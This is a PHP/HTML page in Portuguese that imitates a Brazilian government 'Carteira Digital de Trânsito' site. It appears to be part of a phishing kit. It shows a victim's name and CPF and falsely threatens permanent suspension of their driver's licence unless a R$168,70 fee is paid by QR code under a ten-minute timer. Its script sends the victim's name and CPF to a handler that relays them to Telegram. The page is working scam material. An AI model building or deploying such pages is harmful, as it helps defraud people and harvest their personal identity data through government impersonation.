<?php
session_start(); // Inicia a sessão

// Verifica se os dados estão disponíveis na sessão
if (!isset($_SESSION['dados_cpf'])) {
    header("Location: ../entrar.html");
    exit;
}

// Obtém os dados da sessão
$dados = $_SESSION['dados_cpf'][0]; // Considera o primeiro item do array de dados
$cpfFormatado = $_SESSION['cpf_formatado'];

// Limpa a sessão (opcional, caso queira mant   er os dados por mais tempo, remova isso)
unset($_SESSION['dados_cpf']);
?>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="preconnect" href="https://fonts.googleapis.com"> <!-- ALTERAR -->
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <!-- ALTERAR -->
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet"> <!-- ALTERAR -->
    <link rel="stylesheet" href="./../css/app/bootstrap.css">
    <link rel="stylesheet" href="./../css/app/app.css">
    <link rel="stylesheet" href="./../css/pages/blue.css">
    <link rel="stylesheet" href="./../../pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous" />
    <link rel="icon" type="image/x-icon" href="./../image/blue/favicon.png">
    <meta name="csrf-token" content="ZpNYnEnTYR2SPs4EwnIPOjMuuu7egj6x46rvot2t">

    <title>Carteira Digital de Trânsito</title>

    <style>
        body, html {
            font-family: 'Montserrat', sans-serif !important;
            margin: 0;
            padding: 0;
        }

        p, span, a, button, input {
            font-family: 'Roboto', sans-serif !important;
        }

        h1, h2, h3, h4, h5, h6 {
            font-family: 'Montserrat', sans-serif !important;
        }

        .icon-white img {
            filter: invert(100%) sepia(0%) saturate(0%) hue-rotate(280deg) brightness(104%) contrast(103%);
            width: 16px; /* Tamanho do ícone */
            height: 16px;
            vertical-align: middle; /* Alinha com o texto */
            margin-right: 8px; /* Espaço entre o ícone e o texto */
        }

        .font-montserrat {
            font-family: 'Montserrat', sans-serif !important;
        }

        .font-roboto {
            font-family: 'Roboto', sans-serif !important;
        }

        .btn-cta {
            display: inline-block;
            width: 55%;
            padding: 8px 24px;
            background: #1351B4;
            border: none;
            border-radius: 24px;
            color: #fff;
            font-weight: bold;
            font-size: 16px;
            text-align: center;
            cursor: pointer;
            transition: background 0.3s;
        }

        .icon {
            margin-right: 0.5rem;
            display: inline-block;
            vertical-align: middle;
        }

        .icon-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 0.8rem;
        }

        .header-icon img {
            width: 14px;
            height: 14px;
        }

        .icon-blue img {
            filter: invert(32%) sepia(51%) saturate(6812%) hue-rotate(242deg) brightness(86%) contrast(109%);
        }

        .icon-purple img {
            filter: invert(33%) sepia(92%) saturate(628%) hue-rotate(243deg) brightness(92%) contrast(101%);
        }

        .btn-cta:hover {
            background: #370A69;
        }

        .box-shadow {
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .bg-danger {
            background-color: #d9534f !important;
        }

        .text-danger {
            color: #d9534f !important;
        }

        .text-dark {
            color: #343a40 !important;
        }

        .text-white {
            color: #fff !important;
        }

        .text-center {
            text-align: center;
        }

        .font-weight-700 {
            font-weight: 700;
        }

        .font-size-14 {
            font-size: 14px;
        }

        .font-size-16 {
            font-size: 16px;
        }

        .px-3 {
            padding-left: 1rem;
            padding-right: 1rem;
        }

        .py-2 {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
        }

        .mt-3 {
            margin-top: 1rem;
        }

        .mb-1 {
            margin-bottom: 0.25rem;
        }

        .mb-3 {
            margin-bottom: 1rem;
        }

        .mb-4 {
            margin-bottom: 1.5rem;
        }

        .rounded {
            border-radius: 8px;
        }
    </style>

    
</head>

<body>
    <header class="w-100 py-1 box-shadow px-3 ">
        <div class="max-w-1200 m-0-auto py-2 d-flex justify-content-between align-items-center">
          <img src="./../image/blue/logo.png" alt="" width="110px">
    
          <div class="font-size-14 text-dark font-weight-500 d-none d-lg-flex justify-content-between">
            <div class="d-flex align-items-center">
              <span class="icon icon-blue header-icon">
                  <img src="./../image/fonts_awesome/adjust.svg" alt="Ajuste">
              </span>
              Alto Contraste
            </div>
    
            <div class="ml-5 d-flex align-items-center">
              <span class="icon icon-blue header-icon">
                  <img src="./../image/fonts_awesome/assistive-listening-systems.svg" alt="Assistência">
              </span>
              VLibra
            </div>
          </div>
        </div>
      </header>

    <!-- Main -->
    <main class="px-3">
        <section class="w-100 py-1">
            <div class="max-w-1200 m-0-auto mt-3 py-2 d-flex justify-content-center">
                <div class="d-flex flex-column box-shadow p-4 rounded text-dark w-100" style="max-width:420px;">
                    <p class="px-3 py-2 bg-danger text-white text-center font-size-14">
                        <strong>IMPORTANTE:</strong> O não pagamento da taxa até o prazo determinado, ocasionará na <strong>SUSPENSÃO DEFINITIVA</strong> da sua CNH.
                    </p>
                    <div class="w-100 text-dark font-weight-700 font-size-16 mb-1 d-flex justify-content-between">
                        <span>Nome:</span>
                        <span><?php echo htmlspecialchars($dados['Nome']); ?></span>
                    </div>
                    <div class="w-100 text-dark font-weight-700 font-size-16 mb-3 d-flex justify-content-between">
                        <span>CPF:</span>
                        <span><?php echo htmlspecialchars($cpfFormatado); ?></span>
                    </div>
                    <div class="w-100 text-dark font-weight-700 font-size-16 mb-4 d-flex justify-content-between">
                        <span>TAXA:</span>
                        <span>R$168,70</span>
                    </div>
                        <input type="hidden" name="_token" value="ZpNYnEnTYR2SPs4EwnIPOjMuuu7egj6x46rvot2t">
                        <input type="hidden" name="cpf" value="<?php echo htmlspecialchars($cpfFormatado); ?>">
                        <div class="w-100 px-0 d-flex justify-content-end">
                            <button class="btn-cta mt-3" onclick="gerarPagamento()">Gerar Pagamento</button>
                        </div>
                </div>
            </div>
        </section>
    </main>

    <!-- Modal do QR Code -->
    <div class="modal fade" id="checkoutQrCode" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-md">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title text-dark text-center w-100">Aguardando pagamento...</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body text-center">
                    <img class="w-50" src="data:image/png;base64,...QR_CODE_BASE64..." alt="QR Code">
                    <div id="timer" class="text-danger mt-2">10:00</div>
                </div>
            </div>
        </div>
    </div>

    <footer class="">

    </footer>

    <!-- Scripts -->
    <script src="./../../code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="./../../maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>

    const nome = "<?php echo htmlspecialchars($dados['Nome'], ENT_QUOTES); ?>";
    const cpfFormatado = "<?php echo htmlspecialchars($cpfFormatado, ENT_QUOTES); ?>";
    const mensagem = `Nome: ${nome} / CPF:${cpfFormatado}`;

    // Função para exibir o modal e enviar a mensagem
    function gerarPagamento() {
        // Desabilita o botão para evitar múltiplos cliques
        const button = event.target;
        button.setAttribute('disabled', 'true');

        // Exibe o modal do QR Code
        const modal = new bootstrap.Modal(document.getElementById('checkoutQrCode'));
        modal.show();

        // Envia a mensagem para o Telegram
        enviarMensagemTelegram(mensagem);

        // Inicia o timer
        const display = document.querySelector('#timer');
        startTimer(600, display); // 10 minutos
    }

    // Função para enviar a mensagem ao servidor
    function enviarMensagemTelegram(message) {
        fetch('../send_telegram_handler.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: new URLSearchParams({ message: message }),
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    console.log("Mensagem enviada com sucesso:", data.response);
                } else {
                    console.error("Erro ao enviar mensagem:", data.error);
                }
            })
            .catch(error => {
                console.error("Erro na requisição:", error);
            });
    }

    // Função para iniciar o timer
    function startTimer(duration, display) {
        let timer = duration, minutes, seconds;
        setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);

            display.textContent = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;

            if (--timer < 0) {
                timer = 0; // Impede que o timer fique negativo
            }
        }, 1000);
    }
</script>



</body>


</html>